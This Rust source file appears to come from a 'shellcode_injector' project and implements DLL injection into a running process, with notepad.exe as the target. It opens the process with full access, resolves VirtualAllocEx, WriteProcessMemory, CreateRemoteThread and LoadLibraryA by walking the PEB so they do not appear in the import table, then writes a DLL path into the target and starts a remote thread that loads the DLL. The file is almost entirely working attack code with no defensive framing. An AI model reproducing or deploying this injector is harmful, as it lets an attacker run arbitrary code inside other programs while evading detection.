use std::ffi::CString;
use std::os::raw::c_void;
use std::path::Path;
use std::ptr::null_mut;
use std::{ffi::CStr, mem::size_of};
use shellcode_injector::peb_walker;
use windows::core::BOOL;
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
};
use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE, VIRTUAL_ALLOCATION_TYPE};
use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_ACCESS_RIGHTS, PROCESS_ALL_ACCESS};

pub(crate) type FnVirtualAllocEx = extern "system" fn(
    hProcess: HANDLE,
    lpAddress: *const c_void,
    dwSize: u32,
    flAllocationType: VIRTUAL_ALLOCATION_TYPE,
    flProtect: PAGE_PROTECTION_FLAGS

)-> *mut c_void;

pub (crate ) type FnWriteProcessMemory = extern "system" fn(
    hProcess: HANDLE,
    lpBaseAddress: *mut c_void,
    lpBuffer: *const c_void,
    nSize: u32 ,
    lpNumberOfBytesWritten: *mut u32,
) -> BOOL;

pub(crate) type FnCreateRemoteThread = extern "system" fn(
    hProcess: HANDLE,
    lpThreadAttributes: *mut c_void,
    dwStackSize: u32,
    lpStartAddress: extern "system" fn(*mut c_void) -> u32,
    lpParameter: *mut c_void,
    dwCreationFlags: u32,
    lpThreadId: *mut u32,
    ) -> HANDLE;
fn check_dll_exists(dll_path: &str) -> bool {
    Path::new(dll_path).exists()
}
fn main() {
    
    let target_process = "notepad.exe";
    let pid = find_pid(target_process);
    let dll_path: &'static str = "your path";
    if check_dll_exists(dll_path) {
        println!("DLL exists at path: {}", dll_path);
    } else {
        println!("DLL not found at path: {}", dll_path);
    }

    if pid != 0 {
        println!("Found PID: {}", pid);
        injector(pid, dll_path);
    } else {
        println!("Process not found.");
    }
}



fn find_pid(target_process_name: &str) -> u32 {
    let mut pe32 = PROCESSENTRY32 {
        dwSize: size_of::<PROCESSENTRY32>() as u32,
        ..Default::default()
    };

    unsafe {
        let snapshot = match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
            Ok(handle) => handle,
            Err(err) => {
                println!("CreateToolhelp32Snapshot failed: {}", err.message());
                return 0;
            }
        };

        if Process32First(snapshot, &mut pe32).is_ok() {
            loop {
                let proc_name = CStr::from_ptr(pe32.szExeFile.as_ptr())
                    .to_string_lossy()
                    .into_owned();

                if proc_name.eq_ignore_ascii_case(target_process_name) {
                    let _ = CloseHandle(snapshot);
                    return pe32.th32ProcessID;
                }

                if Process32Next(snapshot, &mut pe32).is_err() {
                    break;
                }
            }
        } else {
            println!("Process32First failed.");
        }

        let _ = CloseHandle(snapshot);
    }

    0
}

fn injector(pid : u32 , dll_path: &str){

    let open_process = unsafe { OpenProcess(PROCESS_ALL_ACCESS ,0 , pid) }; //opens an existing local process object
      let mut remote_mem: *mut c_void = std::ptr::null_mut();

    if open_process == std::ptr::null_mut(){
        println!("failed to open ");
    }

    let path_bytes = CString::new(dll_path).unwrap();
    let path_len = path_bytes.as_bytes_with_nul().len();

    let va_func_addr = unsafe { peb_walker("kernel32.dll", "VirtualAllocEx") };
    if let Some(addr) = va_func_addr {
        let virtual_alloc_ex_func: FnVirtualAllocEx = unsafe { std::mem::transmute(addr) };
        remote_mem =
            virtual_alloc_ex_func(
                HANDLE(open_process),
                std::ptr::null(),
                path_len as u32,
                MEM_RESERVE | MEM_COMMIT,
                PAGE_READWRITE,
            );
    }
    else {
        println!("Failed to resolve addr");
    }

    let wp_func_addr = unsafe { peb_walker("kernel32.dll", "WriteProcessMemory")};
    if let Some(addr) = wp_func_addr{
        let write_process_func: FnWriteProcessMemory = unsafe{ std::mem::transmute(addr)};
        let _write_mem =
            write_process_func(
                windows::Win32::Foundation::HANDLE(open_process),
                remote_mem,
                path_bytes.as_ptr() as _,
                path_len as u32,
                null_mut(),
                
            );
    }
     else {
        println!("Failed to resolve addr");
    }

    let crt_func_addr = unsafe { peb_walker("kernel32.dll", "CreateRemoteThread") };
    let loadlib_addr = unsafe { peb_walker("kernel32.dll", "LoadLibraryA") };


    if let (Some(crt_addr), Some(loadlib_addr)) = (crt_func_addr, loadlib_addr) {
        let create_remote_thread_func: FnCreateRemoteThread =unsafe { std::mem::transmute(crt_addr) };
        
        let thread_handle = unsafe {
            create_remote_thread_func(
                HANDLE(open_process),
                std::ptr::null_mut(),
                0,
                std::mem::transmute(loadlib_addr),
                remote_mem,
                0,
                std::ptr::null_mut(),
            )
        };

        if thread_handle == windows::Win32::Foundation::HANDLE(std::ptr::null_mut()) {
            println!("CreateRemoteThread failed.");
        } else {
            println!("success.");
        }
    } else {
        println!("Failed everything");
    }




}